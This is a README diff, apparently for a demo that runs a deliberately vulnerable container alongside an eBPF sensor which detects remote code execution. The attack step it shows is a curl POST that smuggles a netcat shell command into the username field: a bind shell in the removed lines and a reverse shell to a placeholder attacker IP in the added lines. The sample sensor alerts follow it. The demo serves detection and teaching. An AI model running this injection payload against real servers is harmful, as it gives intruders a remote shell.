@@ -21,26 +21,22 @@ The demo consists of two main components:
 git clone https://github.com/Astixxx/RCE-demo.git
 cd RCE-demo
 
+# Run the eBPF-sensor on host machine
+sudo ./sensor.bt
+
 # Build the vulnerable container
 docker build -t rce-vuln-app .
 
 # Run the container (Run only in LAN!!!)
 docker run -d --rm\
-  --name rce-target \
-  -p 127.0.0.1:8080:8080 \  # Web port for our web-server
-  -p 127.0.0.1:4000:4000 \  # Remote shell port
+  --name rce-auth-server \
+  -p 5000:5000 \  # Web port for our web-server
   rce-vuln-app
 
-# Run the eBPF-sensor
-docker exec -it rce-target ./eBPF-hook.sh
-
 # Attack vunlnable server (input don't shielded)
-curl -X POST http://localhost:8080/ -d "username=; nc -lvnp 4000 -e /bin/bash;&password=test"
+curl -X POST http://<rce_server_ip>:5000/ -d "username=; nc -e /bin/bash <attacker_ip> <attacker_port>;&password=test"
 
 # Watch the output of eBPF-sensor
-...
-[!!!] MALICIOUS BEHAVIOR DETECTED ---> Possible RCE
-bash(23618): tracepoint:syscalls:sys_enter_execve
-[!!!] MALICIOUS BEHAVIOR DETECTED ---> Possible RCE
-nc(23618): tracepoint:syscalls:sys_enter_connect
-...
+[ALERT] REVERSE_SHELL_DETECTED
+  pid=n_pid     comm=nc
+  ATT&CK: T1071.001 (Web Protocol)
